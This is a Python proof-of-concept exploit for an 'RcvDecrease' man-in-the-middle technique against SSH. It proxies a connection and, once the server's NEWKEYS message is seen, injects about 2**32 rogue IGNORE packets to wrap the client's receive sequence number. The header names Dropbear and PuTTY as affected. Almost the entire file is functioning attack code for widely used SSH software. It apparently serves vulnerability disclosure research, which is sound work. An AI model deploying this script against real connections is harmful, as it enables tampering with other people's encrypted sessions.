#!/usr/bin/python3
from binascii import unhexlify
from common import contains_newkeys, run_tcp_mitm
from tqdm import trange

#####################################################################################
## Proof of Concept for the RcvDecrease technique                                  ##
##                                                                                 ##
## Tested successfully against:                                                    ##
## - Dropbear 2022.83 (OpenSSH 9.4p1 Server)                                       ##
## - PuTTY 0.79 (OpenSSH 9.4p1 Server)                                             ##
##                                                                                 ##
## Tested unsuccessfully:                                                          ##
## - AsyncSSH / libssh (Timeouts)                                                  ##
## - OpenSSH (Wrap-Around Detection)                                               ##
##                                                                                 ##
## Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0    ##
#####################################################################################

# IP and port for the TCP proxy to bind to
PROXY_IP = '127.0.0.1'
PROXY_PORT = 2222

# IP and port of the server
SERVER_IP = '127.0.0.1'
SERVER_PORT = 22

# C.Rcv will be decreased by N
N = 1

rogue_msg_ignore = unhexlify('0000000C060200000000000000000000')
def inject_rcvdecrease(in_socket, out_socket):
    try:
        while True:
            data = in_socket.recv(4096)
            if contains_newkeys(data):
                print("[+] SSH_MSG_NEWKEYS sent by server identified!")
                print(f"[+] Injecting 2**32 - {N} SSH_MSG_IGNORE messages to decrease C.Rcv by {N}!")
                for _ in trange(2**32 - N):
                    out_socket.send(rogue_msg_ignore)
            if len(data) == 0:
                break
            out_socket.send(data)
    except ConnectionResetError:
        print("[!] Socket connection has been reset. Closing sockets.")
    except OSError:
        print("[!] Sockets closed by another thread. Terminating pipe_socket_stream thread.")
    in_socket.close()
    out_socket.close()

if __name__ == '__main__':
    print("--- Proof of Concept for RcvDecrease technique ---")
    print("[+] WARNING: Connection failure will occur, this is expected as sequence numbers will not match.")
    run_tcp_mitm(PROXY_IP, PROXY_PORT, SERVER_IP, SERVER_PORT, forward_server_to_client=inject_rcvdecrease)
